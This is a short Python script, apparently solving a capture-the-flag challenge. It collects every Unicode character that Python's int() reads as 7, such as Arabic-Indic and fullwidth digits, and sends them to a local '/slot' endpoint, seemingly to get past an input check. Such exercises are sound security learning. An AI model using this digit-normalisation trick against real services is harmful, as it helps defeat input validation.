import os
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

candidates = ""
for i in range(0, 0x10FFFF + 1):
    c = chr(i)
    try:
        if int(c) == 7:
            candidates += c
    except:
        pass

print(f"{candidates = }")
# 7٧۷߇७৭੭૭୭௭౭೭൭෭๗໗༧၇႗៧᠗᥍᧗᪇᪗᭗᮷᱇᱗꘧꣗꤇꧗꧷꩗꯷７𐒧𐴷𑁭𑃷𑄽𑇗𑋷𑑗𑓗𑙗𑛇𑜷𑣧𑥗𑱗𑵗𑶧𑽗𖩧𖫇𖭗𝟕𝟟𝟩𝟳𝟽𞅇𞋷𞓷𞥗🯷

res = client.get("/slot", params={"candidates": candidates[:10]})
print(res.json())
